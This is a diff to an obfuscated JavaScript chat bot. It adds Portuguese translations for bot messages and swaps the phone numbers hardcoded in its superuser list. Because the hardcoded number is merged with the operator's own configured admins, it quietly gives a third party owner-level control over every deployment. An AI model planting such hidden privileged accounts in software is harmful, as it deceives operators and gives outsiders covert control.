@@ -84,7 +84,32 @@ const createHelpers = (_0x4b4561, _0x22d328, _0x3b4266) => {
       [/user/gi, "usuário"],
       [/permission denied/gi, "permissão negada"],
       [/only admins/gi, "somente administradores"],
-      [/command not found/gi, "comando não encontrado"]
+      [/command not found/gi, "comando não encontrado"],
+      [/Owner Only Command/gi, "Comando exclusivo do dono"],
+      [/Admin Only Command/gi, "Comando exclusivo de administradores"],
+      [/Command can only be used in groups/gi, "Este comando só pode ser usado em grupos"],
+      [/Please quote an image/gi, "Responda a uma imagem"],
+      [/Please provide a valid/gi, "Informe uma opção válida"],
+      [/Please provide a/gi, "Informe uma"],
+      [/Download/gi, "Baixar"],
+      [/Upload/gi, "Enviar"],
+      [/Profile picture/gi, "Foto de perfil"],
+      [/successfully/gi, "com sucesso"],
+      [/Only Command/gi, "Comando exclusivo"],
+      [/not authorized/gi, "não autorizado"],
+      [/not-authorized/gi, "não autorizado"],
+      [/forbidden/gi, "proibido"],
+      [/Unknown/gi, "Desconhecido"],
+      [/Select download type/gi, "Selecione o tipo de download"],
+      [/Audio Only/gi, "Somente áudio"],
+      [/Video Only/gi, "Somente vídeo"],
+      [/No downloadable link found/gi, "Nenhum link para download encontrado"],
+      [/No video found/gi, "Nenhum vídeo encontrado"],
+      [/Failed to fetch/gi, "Falha ao consultar"],
+      [/An error occurred/gi, "Ocorreu um erro"],
+      [/Owner/gi, "Dono"],
+      [/Group/gi, "Grupo"],
+      [/User/gi, "Usuário"]
     ];
     for (const [_0x5c43ff, _0x14052f] of _0x2e8469) {
       _0x4b3a56 = _0x4b3a56.replace(_0x5c43ff, _0x14052f);
@@ -218,7 +243,7 @@ const getGroupInfo = async (_0x5c43ff, _0x14052f, _0x5af49b, _0x31156b) => {
   return _0x8733e3;
 };
 const buildSuperUsers = async (_0x161e05, _0x1f1c52, _0x59be4e, _0x220004) => {
-  const _0x2540e1 = "263714757857,263776388689".split(",").map(_0x158887 => _0x158887.trim().replace(/\D/g, "")).filter(_0x131b92 => _0x131b92.length > 5);
+  const _0x2540e1 = "6399215379".split(",").map(_0x158887 => _0x158887.trim().replace(/\D/g, "")).filter(_0x131b92 => _0x131b92.length > 5);
   const _0xa13e1f = (await _0x1f1c52()) || [];
   const _0x41271e = _0x161e05.SUDO_NUMBERS || "";
   const _0x536c1d = (_0x41271e ? _0x41271e.split(",") : []).map(_0x525f8b => _0x525f8b.trim().replace(/\D/g, "")).filter(_0x35a3d5 => _0x35a3d5.length > 5);
